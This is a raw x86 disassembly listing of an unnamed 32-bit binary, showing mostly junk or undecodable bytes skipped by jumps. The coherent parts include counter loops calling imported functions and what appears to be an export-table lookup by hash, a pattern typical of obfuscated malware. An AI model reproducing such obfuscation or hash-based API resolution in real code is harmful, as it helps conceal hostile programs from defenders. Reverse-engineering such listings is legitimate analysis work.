  40190c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40190d:	imul   eax,ecx,0xffffffa8
  401910:	lods   eax,DWORD PTR ds:[esi]
  401911:	out    0x66,eax
  401913:	jo     0x401991
  401915:	jl     0x4018b9
  401917:	jl     0x401995
  401919:	jl     0x401944
  40191b:	push   ds
  40191c:	cmp    ecx,DWORD PTR gs:[ecx+edx*1]
  401920:	fstp   DWORD PTR [esi+0x69]
  401923:	adc    dh,BYTE PTR cs:[esi*4+0xc7e5dd]
  40192b:	(bad)  
  40192c:	(bad)  
  40192d:	mov    eax,0x54d2026
  401932:	dec    eax
  401933:	xchg   esi,eax
  401934:	xlat   BYTE PTR ds:[ebx]
  401935:	das    
  401936:	jns    0x40199d
  401938:	pop    ebx
  401939:	xchg   edi,eax
  40193a:	icebp  
  40193b:	or     al,0xf9
  40193d:	sti    
  40193e:	mov    ebx,0xfe6e3c61
  401943:	sar    BYTE PTR [eax],0x1e
  401946:	fwait
  401947:	mov    edx,0xa4f2ba87
  40194c:	dec    bp
  40194e:	aas    
  40194f:	ret    0xe278
  401952:	aad    0xcb
  401954:	scas   eax,DWORD PTR es:[edi]
  401955:	sub    al,BYTE PTR [edi]
  401957:	std    
  401958:	fwait
  401959:	inc    edx
  40195a:	pop    eax
  40195b:	sub    esp,esi
  40195d:	fisub  DWORD PTR [esi-0x4712e858]
  401963:	imul   edx,edx,0x5786b209
  401969:	call   0x66f5a04
  40196e:	mov    dl,0x28
  401970:	adc    BYTE PTR [edx-0x2522a762],bh
  401976:	in     eax,dx
  401977:	dec    edi
  401978:	pop    ecx
  401979:	mov    BYTE PTR [ebx-0x75171666],bh
  40197f:	xchg   edx,eax
  401980:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401981:	fisttp WORD PTR [eax*2+0x5197623]
  401988:	repnz loope 0x401956
  40198b:	push   esi
  40198c:	clc    
  40198d:	je     0x401969
  40198f:	xor    al,0xe1
  401991:	mov    ebp,0x2747d7f5
  401996:	out    dx,al
  401997:	mov    edx,0x3e4963fe
  40199c:	sbb    al,0xbb
  40199e:	and    BYTE PTR [ecx-0x5f],cl
  4019a1:	fmul   DWORD PTR [ebx-0x32740064]
  4019a7:	dec    ecx
  4019a8:	xor    esp,DWORD PTR [esi]
  4019aa:	jge    0x4019ee
  4019ac:	(bad)
  4019b0:	cmp    ebp,ebp
  4019b2:	mov    cl,0x72
  4019b4:	out    0x2d,al
  4019b6:	xchg   esp,eax
  4019b7:	aad    0x45
  4019b9:	cli    
  4019ba:	xchg   esi,eax
  4019bb:	enter  0x4963,0x5d
  4019bf:	adc    edx,ecx
  4019c1:	das    
  4019c2:	jae    0x4019f2
  4019c4:	xor    ecx,DWORD PTR [ebx-0x2e984bbd]
  4019ca:	adc    ecx,0x36b4dd63
  4019d0:	push   DWORD PTR [ebp+0x8]
  4019d3:	call   0x408097
  4019d8:	jmp    0x401aab
  4019dd:	cld    
  4019de:	mov    ecx,eax
  4019e0:	mov    ecx,ebx
  4019e2:	dec    ebx
  4019e3:	mov    edi,0x495a648b
  4019e8:	aad    0x6
  4019ea:	push   edx
  4019eb:	bound  ebx,QWORD PTR [esi+0x7c7c73ac]
  4019f1:	mov    ds:0xb77c7c7c,al
  4019f6:	inc    ebx
  4019f7:	enter  0x2735,0xe7
  4019fb:	sbb    eax,0x66b82c79
  401a00:	push   edi
  401a01:	xchg   esp,eax
  401a02:	pusha  
  401a03:	mov    ch,0xc3
  401a05:	push   0x9ed41b73
  401a0a:	out    dx,al
  401a0b:	(bad)  
  401a0f:	xor    DWORD PTR [esi],eax
  401a11:	(bad)  
  401a12:	into   
  401a13:	dec    ebp
  401a14:	push   0x5a2d46c2
  401a19:	ficomp DWORD PTR [esi+0x39]
  401a1c:	pop    ebp
  401a1d:	in     eax,dx
  401a1e:	(bad)  
  401a20:	adc    al,bh
  401a22:	push   edx
  401a23:	mov    ebp,DWORD PTR [esi]
  401a25:	nop
  401a26:	out    0x91,al
  401a28:	aad    0x22
  401a2a:	or     ebp,DWORD PTR [ebx-0x73]
  401a2d:	inc    ebx
  401a2e:	jecxz  0x401a77
  401a30:	out    dx,eax
  401a31:	push   eax
  401a32:	dec    ecx
  401a33:	hlt    
  401a34:	xor    al,0xef
  401a36:	inc    edi
  401a37:	sahf   
  401a38:	mov    ebp,0xa96299af
  401a3d:	mov    DWORD PTR [ebx+0x1d],esp
  401a40:	sub    edi,0xc14c3ff1
  401a46:	cld    
  401a47:	sbb    DWORD PTR [eax],edx
  401a49:	(bad)  
  401a4a:	fldpi  
  401a4c:	(bad)  
  401a4d:	ds mov cl,0xe3
  401a50:	add    al,0x76
  401a52:	or     esp,DWORD PTR [edx+0x4c]
  401a55:	mov    ch,BYTE PTR [edx+edx*8]
  401a58:	ds (bad) 
  401a5a:	gs mov al,0xf3
  401a5d:	repnz xchg esi,eax
  401a5f:	push   0x62907600
  401a64:	enter  0x9413,0x2e
  401a68:	aam    0xf5
  401a6a:	repnz add eax,0xa92c48be
  401a70:	sar    BYTE PTR [edx-0x7],0xfb
  401a74:	xchg   BYTE PTR [edx+0x4f],bh
  401a77:	dec    ebx
  401a78:	in     eax,dx
  401a79:	clc    
  401a7a:	jmp    0xd96f1fdf
  401a7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a80:	fcmove st,st(5)
  401a82:	sahf   
  401a83:	scas   al,BYTE PTR es:[edi]
  401a84:	mov    ds:0xb6a5743b,al
  401a89:	pop    eax
  401a8a:	rol    BYTE PTR [esi+eiz*8],cl
  401a8d:	icebp  
  401a8e:	pop    DWORD PTR [ebp+0x30]
  401a91:	hlt    
  401a92:	shl    DWORD PTR [edx+ecx*2],1
  401a95:	cmp    dh,BYTE PTR [ebx]
  401a97:	stos   BYTE PTR es:[edi],al
  401a98:	ja     0x401a2d
  401a9a:	mov    dh,BYTE PTR [eax+0x49]
  401a9d:	mov    DWORD PTR [ebp-0x51],edx
  401aa0:	sub    BYTE PTR [esi-0x4b093dd0],dl
  401aa6:	in     al,0x97
  401aa8:	mov    al,ds:0x45892e4d
  401aad:	in     al,dx
  401aae:	mov    eax,DWORD PTR [ebp-0x4]
  401ab1:	add    DWORD PTR ds:0x44b6cc,ecx
  401ab7:	mov    ecx,DWORD PTR [ebp-0x14]
  401aba:	xor    eax,esi
  401abc:	add    eax,ebx
  401abe:	mov    DWORD PTR ds:0x4248d2,0x6998
  401ac8:	cmp    ecx,eax
  401aca:	mov    DWORD PTR ds:0x44b6d4,0x4e4a
  401ad4:	je     0x4021a9
  401ada:	mov    eax,DWORD PTR [ebp-0x14]
  401add:	mov    eax,DWORD PTR [eax+0x18]
  401ae0:	and    DWORD PTR ds:0x448994,0x0
  401aea:	xor    ecx,ecx
  401aec:	add    ecx,DWORD PTR ds:0x448994
  401af2:	inc    ecx
  401af3:	mov    DWORD PTR ds:0x448994,ecx
  401af9:	cmp    DWORD PTR ds:0x448994,0x7
  401b00:	jne    0x401b19
  401b06:	push   0x41098d
  401b0b:	push   0x41075f
  401b10:	push   DWORD PTR [ebp-0x1c]
  401b13:	call   DWORD PTR ds:0x443344
  401b19:	cmp    DWORD PTR ds:0x448994,0x6
  401b20:	jne    0x401b35
  401b26:	xor    ecx,ecx
  401b28:	xor    ecx,DWORD PTR ds:0x448994
  401b2e:	inc    ecx
  401b2f:	mov    DWORD PTR ds:0x448994,ecx
  401b35:	cmp    DWORD PTR ds:0x448994,0x12
  401b3c:	jb     0x401aea
  401b42:	sub    DWORD PTR ds:0x4248d6,0x3b9b
  401b4c:	jmp    0x401c1f
  401b51:	inc    ecx
  401b52:	adc    eax,0x9d621a92
  401b57:	jns    0x401bc6
  401b59:	retf   
  401b5a:	push   cs
  401b5b:	ins    BYTE PTR es:[edi],dx
  401b5c:	jno    0x401b1c
  401b5e:	leave  
  401b5f:	inc    esp
  401b60:	in     eax,0xd2
  401b62:	jb     0x401be0
  401b64:	jl     0x401b08
  401b66:	jl     0x401be4
  401b68:	jl     0x401b48
  401b6a:	sbb    eax,0x42a0f127
  401b6f:	and    al,ch
  401b71:	pop    eax
  401b72:	arpl   WORD PTR [eax-0xdd2701e],bp
  401b78:	ficomp WORD PTR [ebx-0x3e6e1836]
  401b7e:	xor    edi,DWORD PTR [ecx-0x65]
  401b81:	fstp   DWORD PTR [edi]
  401b83:	addr16 and edi,ecx
  401b86:	pop    es
  401b87:	dec    ecx
  401b88:	out    dx,eax
  401b89:	daa    
  401b8a:	pop    ecx
  401b8b:	and    DWORD PTR [edx-0xf7fb3c8],edi
  401b91:	add    ebp,DWORD PTR [edi+0x55]
  401b94:	push   edi
  401b95:	adc    DWORD PTR [eax+ebx*1-0x3778481f],esi
  401b9c:	cdq    
  401b9d:	mov    esp,0x10201f0f
  401ba2:	and    dl,dl
  401ba4:	mov    esi,0x2ec8c109
  401ba9:	sub    cl,dh
  401bab:	jmp    0x401c1e
  401bad:	xor    al,0x19
  401baf:	push   cs
  401bb0:	mov    esi,0x8d32bc08
  401bb5:	cdq    
  401bb6:	nop
  401bb7:	cmp    eax,0xc56662fc
  401bbc:	sub    cl,dh
  401bbe:	int    0xe7
  401bc0:	cmp    al,0x98
  401bc2:	push   es
  401bc3:	sti    
  401bc4:	lds    ebx,FWORD PTR [ecx-0x2c]
  401bc7:	or     eax,0x30af9dd0
  401bcc:	fadd   DWORD PTR cs:[esi+0x174bed43]
  401bd3:	ret    
  401bd4:	fnsave [ebx]
  401bd6:	xchg   ebp,eax
  401bd7:	jno    0x401b84
  401bd9:	xchg   edx,eax
  401bda:	pop    ebx
  401bdb:	std    
  401bdc:	fadd   DWORD PTR [esi]
  401bde:	hlt    
  401bdf:	mov    dh,bh
  401be1:	push   edi
  401be2:	jmp    0x4c03001f
  401be7:	xor    al,0x1e
  401be9:	pop    ebx
  401bea:	addr16 pushf 
  401bec:	push   0x2a
  401bee:	xchg   edx,eax
  401bef:	fbld   TBYTE PTR [edi+0x26]
  401bf2:	fwait
  401bf3:	push   es
  401bf4:	(bad)  
  401bf5:	outs   dx,BYTE PTR ds:[esi]
  401bf6:	xchg   ebx,eax
  401bf7:	dec    edx
  401bf8:	sbb    DWORD PTR [ecx-0x1e],eax
  401bfb:	jmp    0x401bef
  401bfd:	icebp  
  401bfe:	je     0x401bd6
  401c00:	push   0x28
  401c02:	or     eax,0xc6fd774a
  401c07:	jmp    0xf662:0x40959ee1
  401c0e:	sub    cl,dl
  401c10:	inc    edx
  401c11:	lods   al,BYTE PTR ds:[esi]
  401c12:	gs dec edi
  401c14:	mov    dh,0xfc
  401c16:	mov    bh,0x68
  401c18:	popa   
  401c19:	or     al,0xc5
  401c1b:	rol    BYTE PTR [ebx+0x458959af],1
  401c21:	loopne 0x401ba4
  401c23:	loope  0x401bd8
  401c25:	push   0x458b0000
  401c2a:	in     al,dx
  401c2b:	mov    ecx,DWORD PTR [ebp+0x8]
  401c2e:	and    DWORD PTR ds:0x44899c,0x44b6e0
  401c38:	add    ecx,DWORD PTR [eax+0x20]
  401c3b:	movzx  eax,BYTE PTR ds:0x44e424
  401c42:	and    eax,DWORD PTR ds:0x44b6e4
  401c48:	mov    ds:0x44e424,eax
  401c4d:	mov    DWORD PTR [ebp-0x28],ecx
  401c50:	sub    DWORD PTR ds:0x4248de,ecx
  401c56:	mov    eax,DWORD PTR [ebp-0x14]
  401c59:	and    DWORD PTR ds:0x41074b,0x0
  401c63:	jmp    0x401c75
  401c68:	mov    ecx,DWORD PTR ds:0x41074b
  401c6e:	inc    ecx
  401c6f:	mov    DWORD PTR ds:0x41074b,ecx
  401c75:	cmp    DWORD PTR ds:0x41074b,0x1d
  401c7c:	jae    0x401cc9
  401c82:	cmp    DWORD PTR ds:0x41074b,0x9
  401c89:	jne    0x401caa
  401c8f:	push   DWORD PTR [ebp-0x20]
  401c92:	push   0x8068
  401c97:	push   0x67b9
  401c9c:	push   0x4109ab
  401ca1:	push   DWORD PTR [ebp-0x24]
  401ca4:	call   DWORD PTR ds:0x4430c8
  401caa:	cmp    DWORD PTR ds:0x41074b,0x8
  401cb1:	jne    0x401cc4
  401cb7:	mov    ecx,DWORD PTR ds:0x41074b
  401cbd:	inc    ecx
  401cbe:	mov    DWORD PTR ds:0x41074b,ecx
  401cc4:	jmp    0x401c68
  401cc9:	mov    ecx,DWORD PTR [ebp+0x8]
  401ccc:	not    DWORD PTR ds:0x44898c
  401cd2:	add    ecx,DWORD PTR [eax+0x24]
  401cd5:	xor    DWORD PTR ds:0x44b6e0,0x6435
  401cdf:	mov    DWORD PTR [ebp-0x2c],ecx
  401ce2:	jmp    0x401db5
  401ce7:	cmp    edi,DWORD PTR [ebx]
  401ce9:	mov    eax,0xbd95b815
  401cee:	cmp    eax,0x3403dcf7
  401cf3:	mov    edx,DWORD PTR [ebp+0x75189a1f]
  401cf9:	jl     0x401d77
  401cfb:	mov    ds:0xe87c7c7c,al
  401d00:	fstp   TBYTE PTR [eax-0x6f05b53f]
  401d06:	mov    ebp,0x17ba5c64
  401d0b:	mov    cl,0x92
  401d0d:	aas    
  401d0e:	(bad)  
  401d0f:	cld    
  401d10:	pushf  
  401d11:	sbb    ebx,ecx
  401d13:	cmp    al,0xb9
  401d15:	add    eax,0x457edfd6
  401d1a:	inc    esi
  401d1b:	lods   al,BYTE PTR ds:[esi]
  401d1c:	add    ebx,ebp
  401d1e:	sub    DWORD PTR [esi],esi
  401d20:	fisttp WORD PTR [ebx-0x12]
  401d23:	xor    ch,BYTE PTR [edx+0x36]
  401d26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d27:	xor    BYTE PTR [esi-0x5872fbcc],0x89
  401d2e:	mov    ebx,0xbe82eec8
  401d33:	call   0x618aefb7
  401d38:	xchg   ebx,eax
  401d39:	std    
  401d3a:	je     0x401d57
  401d3c:	ss or  ebp,ecx
  401d3f:	scas   eax,DWORD PTR es:[edi]
  401d40:	add    cl,BYTE PTR [ebx-0x2bb0bbf5]
  401d46:	inc    esi
  401d47:	and    bl,bl
  401d49:	or     al,0xaa
  401d4b:	test   BYTE PTR [ecx+0x64817ffb],bl
  401d51:	cli    
  401d52:	mov    edx,DWORD PTR [eax-0x164950a8]
  401d58:	sahf   
  401d59:	int3   
  401d5a:	(bad)  
  401d5b:	jns    0x401d41
  401d5d:	fcomp  DWORD PTR [ebp+0x2ae20e1]
  401d63:	cld    
  401d64:	xchg   cl,dh
  401d66:	hlt    
  401d67:	sbb    al,0x9c
  401d69:	sbb    al,0x53
  401d6b:	and    ebx,esp
  401d6d:	fld    QWORD PTR ds:0x9aafc6f7
  401d73:	inc    ecx
  401d74:	aaa    
  401d75:	push   ds
  401d76:	jnp    0x4b5197b1
  401d7c:	mov    bh,0x73
  401d7e:	mov    ecx,DWORD PTR [edx+0x15b9c03d]
  401d84:	adc    al,0x11
  401d86:	js     0x401df0
  401d88:	jg     0x401d3b
  401d8a:	dec    ecx
  401d8b:	and    ah,BYTE PTR [ebp+0x7d]
  401d8e:	and    ecx,DWORD PTR [esi-0x70e427ec]
  401d94:	lods   eax,DWORD PTR ds:[esi]
  401d95:	(bad)  
  401d96:	in     eax,dx
  401d97:	cmc    
  401d98:	repnz or DWORD PTR [edx],edx
  401d9b:	ret    
  401d9c:	daa    
  401d9d:	pop    eax
  401d9e:	pop    esp
  401d9f:	call   0xea30:0x891e2d47
  401da6:	sub    ah,al
  401da8:	js     0x401e06
  401daa:	push   ecx
  401dab:	sub    dl,BYTE PTR [ecx+0x4a12aaaf]
  401db1:	cmp    cl,0x59
  401db4:	fisttp WORD PTR [ebx+0x5c7ec45]
  401dba:	pop    ebx
  401dbb:	pop    es
  401dbc:	inc    ecx
  401dbd:	add    BYTE PTR [ecx],bl
  401dbf:	add    BYTE PTR [eax],al
  401dc1:	add    BYTE PTR [ebx+0x41075b3d],al
  401dc7:	add    BYTE PTR [eax],al
  401dc9:	je     0x401e11
  401dcf:	cmp    DWORD PTR ds:0x41075b,0xb
  401dd6:	jne    0x401de5
  401ddc:	push   DWORD PTR [ebp-0x24]
  401ddf:	call   DWORD PTR ds:0x4430cc
  401de5:	cmp    DWORD PTR ds:0x41075b,0xc
  401dec:	jne    0x401dff
  401df2:	mov    ecx,DWORD PTR ds:0x41075b
  401df8:	dec    ecx
  401df9:	mov    DWORD PTR ds:0x41075b,ecx
  401dff:	mov    ecx,DWORD PTR ds:0x41075b
  401e05:	dec    ecx
  401e06:	mov    DWORD PTR ds:0x41075b,ecx
  401e0c:	jmp    0x401dc2
  401e11:	mov    ecx,DWORD PTR [ebp+0x8]
  401e14:	add    ecx,DWORD PTR [eax+0x1c]
  401e17:	xor    esi,esi
  401e19:	mov    DWORD PTR [ebp-0x14],ecx
  401e1c:	jmp    0x401eef
  401e21:	xor    al,0x72
  401e23:	mov    ds:0x46657dd5,eax
  401e28:	sub    eax,0xe5b1e0bc
  401e2d:	mov    ecx,0x4e612e50
  401e32:	jne    0x401eb0
  401e34:	jl     0x401dd8
  401e36:	jl     0x401eb4
  401e38:	jl     0x401e21
  401e3a:	pop    esp
  401e3b:	xor    BYTE PTR [edx+0x4defd6a0],bl
  401e41:	ins    DWORD PTR es:[edi],dx
  401e42:	in     al,dx
  401e43:	nop
  401e44:	fisttp WORD PTR [edx-0x2]
  401e47:	push   ebp
  401e48:	push   esi
  401e49:	ins    BYTE PTR es:[edi],dx
  401e4a:	fwait
  401e4b:	shl    DWORD PTR [edx+esi*8+0x59],0x77
  401e50:	inc    eax
  401e51:	fs std 
  401e53:	push   eax
  401e54:	mov    ch,0x28
  401e56:	add    ebp,ebp
  401e58:	imul   ebx,DWORD PTR [edx],0xfffffff2
  401e5b:	retf   0xe25
  401e5e:	outs   dx,BYTE PTR ds:[esi]
  401e5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e60:	pusha  
  401e61:	sub    eax,0x2b83c713
  401e66:	add    BYTE PTR [ecx-0x1503012],dl
  401e6c:	jo     0x401e23
  401e6e:	pop    ebp
  401e6f:	xbegin 0x78466261
  401e75:	pop    ds
  401e76:	call   0xed6534d6
  401e7b:	mov    ch,0x18
  401e7d:	mov    BYTE PTR [ecx-0x60],bl
  401e80:	(bad)  
  401e81:	fbstp  TBYTE PTR [eax]
  401e83:	je     0x401ec9
  401e85:	(bad)  
  401e87:	adc    BYTE PTR [eax],ch
  401e89:	xchg   ax,ax
  401e8b:	push   cs
  401e8c:	(bad)  
  401e8d:	in     eax,0x9b
  401e8f:	daa    
  401e90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e91:	test   BYTE PTR ds:0x6f9a706d,dl
  401e97:	mov    dh,BYTE PTR [ebx]
  401e99:	pop    ds
  401e9a:	div    bh
  401e9c:	inc    ecx
  401e9d:	mov    bh,0xe0
  401e9f:	add    eax,0x1bbeafc5
  401ea4:	int3   
  401ea5:	push   edi
  401ea6:	call   0xdb9c38c2
  401eab:	aam    0x58
  401ead:	adc    al,0x39
  401eaf:	out    0xf,al
  401eb1:	ds and eax,0x535dab47
  401eb7:	xchg   ebx,eax
  401eb8:	push   esi
  401eb9:	jno    0x401e8d
  401ebb:	test   BYTE PTR [ecx+0x70],ah
  401ebe:	out    0x89,eax
  401ec0:	inc    esp
  401ec1:	mov    ah,0xed
  401ec3:	xor    BYTE PTR [eax-0x1d138fd4],0xb5
  401eca:	jp     0x401edc
  401ecc:	fnstenv [esi]
  401ece:	sub    BYTE PTR [ebx+0x62b12982],cl
  401ed4:	xor    dl,0xe
  401ed7:	sbb    BYTE PTR [ebx-0x80],dh
  401eda:	and    BYTE PTR [ecx-0x9a138a6],cl
  401ee0:	sub    ecx,DWORD PTR [edi-0xf7a582a]
  401ee6:	loope  0x401f17
  401ee8:	xor    al,0xb9
  401eea:	icebp  
  401eeb:	mov    bh,0x38
  401eed:	and    eax,0xd8458bdd
  401ef2:	mov    ecx,DWORD PTR [ebp+0x8]
  401ef5:	add    ecx,DWORD PTR [eax+edi*4]
  401ef8:	lea    eax,[ebp-0x8]
  401efb:	mov    DWORD PTR [ebp-0x30],ecx
  401efe:	push   eax
  401eff:	push   DWORD PTR [ebp-0x30]
  401f02:	jmp    0x401fd5
  401f07:	pop    esp
  401f08:	jecxz  0x401f20
  401f0a:	xchg   ebp,eax
  401f0b:	mov    ebp,0x1ee56b7d
  401f10:	jb     0x401ec2
  401f12:	daa    
  401f13:	cmp    BYTE PTR [eax],0x8e
  401f16:	in     eax,0xf4
  401f18:	je     0x401f96
  401f1a:	jl     0x401ebe
  401f1c:	jl     0x401f9a
  401f1e:	jl     0x401ed7
  401f20:	fist   DWORD PTR [esi]
  401f22:	xchg   ebx,eax
  401f23:	sub    ch,BYTE PTR [edi+ebp*2-0xec3aa1c]
  401f2a:	mov    DWORD PTR [edx+0x4ab4ee17],ebx
  401f30:	mov    cl,0x2a
  401f32:	and    ah,ah
  401f34:	into   
  401f35:	leave  
  401f36:	aas    
  401f37:	es and eax,0x3005c4f2
  401f3d:	mov    al,0xaa
  401f3f:	pop    ss
  401f40:	jg     0x401fbf
  401f42:	lods   al,BYTE PTR ds:[esi]
  401f43:	jo     0x401fb4
  401f45:	sub    eax,0x22704239
  401f4a:	or     edx,DWORD PTR [ebx+0x7375c329]
  401f50:	(bad)  
  401f51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f52:	bound  ebp,QWORD PTR [ebx+0x44a5b50c]
  401f58:	mov    ebp,0x898b94d0
  401f5d:	ds cmp dh,ah
  401f60:	mov    eax,ds:0xbd8ac4ee
  401f65:	mov    eax,ds:0x22169d55
  401f6a:	mov    WORD PTR [edi-0x10],ss
  401f6d:	pusha  
  401f6e:	lods   eax,DWORD PTR ds:[esi]
  401f6f:	int    0x30
  401f71:	xchg   ebx,eax
  401f72:	(bad)  
  401f73:	sub    DWORD PTR [edi],eax
  401f75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f76:	push   ecx
  401f77:	ret    0xa216
  401f7a:	inc    edi
  401f7b:	les    edi,FWORD PTR [ebx+edx*1+0x70c130cd]
  401f82:	mov    bh,0x44
  401f84:	shl    BYTE PTR [ebp+0x73],0x88
  401f88:	cdq    
  401f89:	add    dl,dh
  401f8b:	nop
  401f8c:	sub    eax,esp
  401f8e:	xchg   esp,eax
  401f8f:	dec    eax
  401f90:	aad    0x69
  401f92:	aas    
  401f93:	add    esp,eax
  401f95:	aad    0xeb
  401f97:	shl    BYTE PTR [ebp+0xf1d0900],1
  401f9d:	jbe    0x401f30
  401f9f:	adc    al,0xb3
  401fa1:	imul   edx,DWORD PTR ds:0x32f8,0x5ff4ef21
  401faa:	inc    eax
  401fab:	xor    BYTE PTR [ebp-0x74],cl
  401fae:	sti    
  401faf:	xor    edx,DWORD PTR [ebx+esi*1+0x40025ac7]
  401fb6:	xor    ebp,edi
  401fb8:	mov    bl,0x7b
  401fba:	es xor al,0xfc
  401fbd:	add    al,0xd4
  401fbf:	sahf   
  401fc0:	fwait
  401fc1:	mov    eax,0x88b27d90
  401fc6:	sbb    eax,0xba6ac4a5
  401fcb:	ins    BYTE PTR es:[edi],dx
  401fcc:	inc    ecx
  401fcd:	add    DWORD PTR [ecx+0x4f],edi
  401fd0:	bnd jbe 0x401fbd
  401fd3:	lods   eax,DWORD PTR ds:[esi]
  401fd4:	jl     0x401fd5
  401fd6:	jne    0x401fe4
  401fd8:	jmp    0x4020ab
  401fdd:	or     dl,BYTE PTR [eax+ebp*1]
  401fe0:	mov    dl,0x2a
  401fe2:	mov    dl,0x6a
  401fe4:	push   esp
  401fe5:	int3   
  401fe6:	xchg   ebp,eax
  401fe7:	xchg   esp,eax
  401fe8:	int    0x1c
  401fea:	ret    
  401feb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fec:	test   BYTE PTR [edx],bh
  401fee:	ja     0x40206c
  401ff0:	jl     0x401f94
  401ff2:	jl     0x402070
  401ff4:	jl     0x402075
  401ff6:	jb     0x401fb3
  401ff8:	push   ecx
  401ff9:	test   eax,0xf5e3bacb
  401ffe:	jae    0x402065
  402000:	push   0xffffffca
  402002:	sahf   
  402003:	sahf   
  402004:	loopne 0x402020
  402006:	retf   0x4fed
  402009:	adc    dl,cl
  40200b:	or     BYTE PTR [ecx+0xd],bl
  40200e:	push   ebp
  40200f:	jb     0x401ffc
  402011:	in     al,dx
  402012:	dec    esi
  402013:	adc    al,0xe7
  402015:	mov    esp,0x19488bf7
  40201a:	or     DWORD PTR [eax+0x60],0x5d7698f0
  402021:	sub    al,ah
  402023:	mov    edi,0x85616d4f
  402028:	popf   
  402029:	call   0x6c05:0xfd477045
  402030:	stos   DWORD PTR es:[edi],eax
  402031:	cmp    BYTE PTR gs:[edi+0x618eb03],dh
  402038:	fbstp  TBYTE PTR [esi-0x1f0cdd17]
  40203e:	dec    esi
  40203f:	(bad)  
  402040:	dec    esp
  402041:	push   ss
  402042:	xchg   edi,ebx
  402044:	fsubr  QWORD PTR [edx+0x23]
  402047:	push   edi
  402048:	or     eax,DWORD PTR [edi+0x12]
  40204b:	out    dx,eax
  40204c:	std    
  40204d:	fs scas eax,DWORD PTR es:[edi]
  40204f:	mov    dh,BYTE PTR [esi]
  402051:	jle    0x402038
  402053:	inc    eax
  402054:	mov    bh,0x29
  402056:	add    BYTE PTR [edx+ebx*4-0x497a0d41],ch
  40205d:	lock dec esi
  40205f:	add    cl,ch
  402061:	pop    esi
  402062:	or     esi,DWORD PTR [edx+0x6f59dd38]
  402068:	or     dh,BYTE PTR [edi]
  40206a:	pop    ebx
  40206b:	fcomp  QWORD PTR [edi-0x63]
  40206e:	pop    es
  40206f:	lock push esp
  402071:	xor    bl,BYTE PTR [esi+0x17]
  402074:	cwde   
  402075:	repz popa 
  402077:	inc    edi
  402078:	mov    bh,0xe6
  40207a:	pop    ebx
  40207b:	mov    al,0x36
  40207d:	xchg   ecx,eax
  40207e:	jg     0x402078
  402080:	mov    ecx,0x5c83cb76
  402085:	fst    QWORD PTR [eax+edi*1]
  402088:	mov    ah,0x2
  40208a:	mov    esi,0x137804eb
  40208f:	in     al,dx
  402090:	imul   edx,DWORD PTR [edx],0xc0ee6a06
  402096:	(bad)  
  402098:	and    al,0x62
  40209a:	icebp  
  40209b:	adc    ah,BYTE PTR [eax+ecx*1-0x1a]
  40209f:	push   edx
  4020a0:	iret   
  4020a1:	lods   eax,DWORD PTR ds:[esi]
  4020a2:	ficom  DWORD PTR [edi-0x1e986cbe]
  4020a8:	pop    ecx
  4020a9:	adc    eax,0x71e8e8d0
  4020ae:	add    BYTE PTR [eax],al
  4020b0:	mov    eax,DWORD PTR [ebp-0x4]
  4020b3:	mov    ecx,DWORD PTR [ebp-0x8]
  4020b6:	xor    eax,0x7510857
  4020bb:	add    eax,ebx
  4020bd:	cmp    ecx,eax
  4020bf:	jne    0x4021b5
  4020c5:	jmp    0x402198
  4020ca:	dec    esp
  4020cb:	xchg   esp,eax
  4020cc:	pop    edi
  4020cd:	add    BYTE PTR [edi-0x25],ah
  4020d0:	arpl   WORD PTR [eax-0x10],bp
  4020d3:	adc    ebx,DWORD PTR [eax+0x58f8d648]
  4020d9:	call   0x7ca2:0x7c7c7760
  4020e0:	jl     0x40215e
  4020e2:	mov    ch,0xe6
  4020e5:	cwde   
  4020e6:	add    eax,0x20d9b510
  4020eb:	sbb    bl,ch
  4020ed:	push   cs
  4020ee:	mov    eax,ds
  4020f0:	sub    ebx,DWORD PTR [ecx+0x1988299e]
  4020f6:	clc    
  4020f7:	ss test eax,0x560bee63
  4020fd:	push   edx
  4020fe:	mov    dl,0xb8
  402100:	fnsave [esi-0x7b3e1ba8]
  402106:	pop    ds
  402107:	jnp    0x402151
  402109:	cmp    al,0xa4
  40210b:	push   ecx
  40210c:	cs cdq 
  40210e:	cwde   
  40210f:	xlat   BYTE PTR ds:[ebx]
  402110:	and    ah,ah
  402112:	in     eax,0xce
  402114:	mov    eax,ds:0xdb13fa9f
  402119:	adc    ebx,DWORD PTR [eax-0x5d]
  40211c:	out    0xca,al
  40211e:	sti    
  40211f:	fprem1 
  402121:	dec    esi
  402122:	cmp    DWORD PTR ds:0xe7e789a0,edx
  402128:	pop    ecx
  402129:	xor    al,0x41
  40212b:	iret   
  40212c:	(bad)  
  40212e:	es mov eax,0x9d080834
  402134:	in     eax,dx
  402135:	and    ebp,0xffffffba
  402138:	lock mov eax,DWORD PTR [ebp-0x69]
  40213c:	in     eax,dx
  40213d:	sbb    ecx,DWORD PTR [eax+0x545a11c8]
  402143:	cmp    eax,0xecbe0773
  402148:	or     eax,esp
  40214a:	stos   BYTE PTR es:[edi],al
  40214b:	pusha  
  40214c:	push   edx
  40214d:	sahf   
  40214e:	cmp    DWORD PTR [esi+0x8],0xe1e5c70a
  402155:	cli    
  402156:	leave  
  402157:	stos   BYTE PTR es:[edi],al
  402158:	popf   
  402159:	shr    ch,1
  40215b:	xor    ch,BYTE PTR [ebp+esi*4-0x1e571689]
  402162:	imul   ecx,edx,0x48
  402165:	mov    gs,WORD PTR [esi]
  402167:	cwde   
  402168:	into   
  402169:	push   0x272b1e4c
  40216e:	and    esp,DWORD PTR [ebx]
  402170:	std    
  402171:	retf   0xd455
  402174:	xchg   edx,eax
  402175:	push   ebp
  402176:	mov    ebp,0x7bc00c17
  40217b:	sub    cl,BYTE PTR [ecx]
  40217d:	fidivr WORD PTR [esi-0xa6a94cb]
  402183:	stc    
  402184:	add    BYTE PTR [ebp+0x3b5080de],ch
  40218a:	adc    DWORD PTR [edi],esp
  40218c:	cmp    DWORD PTR [edi],eax
  40218e:	dec    ebp
  40218f:	in     eax,0xde
  402191:	jb     0x4021a5
  402193:	repz stc 
  402195:	in     al,dx
  402196:	xchg   esp,eax
  402197:	pop    esp
